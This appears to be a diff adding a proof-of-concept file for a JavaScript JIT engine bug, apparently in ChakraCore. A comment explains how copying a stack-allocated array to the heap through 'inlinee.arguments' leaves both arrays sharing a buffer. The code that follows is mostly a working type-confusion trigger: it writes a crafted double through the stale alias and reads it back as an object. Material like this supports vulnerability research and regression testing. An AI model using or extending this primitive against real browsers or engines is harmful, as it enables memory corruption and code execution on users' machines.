@@ -1,0 +1,65 @@
+/*
+If variables don't escape the scope, the variables can be allocated to the stack. However, there are some situations, such as when a bailout happens or accessing to arguments containing stack-allocated variables, where those variables should not exist in the stack. In these cases, the stack-allocated variables are copied to the heap. This is performed by the "*::BoxStackInstance" methods.
+
+Here's an example.
+function inlinee() {
+    return inlinee.arguments[0];
+}
+
+function opt() {
+    let stack_arr = [];
+    // allocate segment to the heap
+    for (let i = 0; i < 100; i++)
+        stack_arr[i] = 0;
+
+    let heap_arr = inlinee(stack_arr);
+    heap_arr[0] = 2;
+
+    print(stack_arr[0]);
+}
+
+function main() {
+    for (let i = 0; i < 100; i++) {
+        opt();
+    }
+}
+
+main();
+
+"stack_arr" is allocated in the stack. When accessing "inlinee.arguments", the stack-allocated variable gets copied to the heap. Therefore, the copied-heap-variable "heap_arr" has the same structure with "stack_arr". The code shows that the two variables share the same buffer by printing out "2". This means, even if one of those arrays' type changes, the other array can access the same buffer with the previous type.
+
+PoC:
+*/
+
+function inlinee() {
+    return inlinee.arguments[0];
+}
+
+function opt(convert_to_var_array) {
+    /*
+    To make the in-place type conversion happen, it requires to segment.
+    */
+
+    let stack_arr = [];  // JavascriptNativeFloatArray
+    stack_arr[10000] = 1.1;
+    stack_arr[20000] = 2.2;
+
+    let heap_arr = inlinee(stack_arr);
+    convert_to_var_array(heap_arr);
+
+    stack_arr[10000] = 2.3023e-320;
+
+    return heap_arr[10000];
+}
+
+function main() {
+    for (let i = 0; i < 10000; i++) {
+        opt(new Function(''));  // Prevents to be inlined
+    }
+
+    print(opt(heap_arr => {
+        heap_arr[10000] = {};  // ConvertToVarArray
+    }));
+}
+
+main();
